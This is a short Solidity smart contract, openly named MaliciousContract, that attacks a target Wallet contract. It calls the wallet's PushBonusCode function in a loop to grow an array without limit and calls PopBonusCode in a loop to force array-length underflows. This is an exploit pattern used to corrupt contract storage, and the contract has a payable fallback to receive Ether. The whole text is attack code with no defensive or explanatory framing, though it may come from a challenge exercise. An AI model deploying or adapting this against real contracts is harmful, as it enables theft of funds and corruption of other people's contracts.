contract MaliciousContract {
    Wallet target;

    // Initialize with target Wallet contract address
    constructor(address _target) public {
        target = Wallet(_target);
    }

    // Exploit PushBonusCode to grow the array uncontrollably
    function exploitPushBonusCode(uint times) public {
        for (uint i = 0; i < times; i++) {
            target.PushBonusCode(i);
        }
    }

    // Exploit PopBonusCode to create underflows
    function exploitPopBonusCode(uint times) public {
        for (uint i = 0; i < times; i++) {
            target.PopBonusCode();
        }
    }

    // Payable fallback to receive Ether
    function () public payable {}
}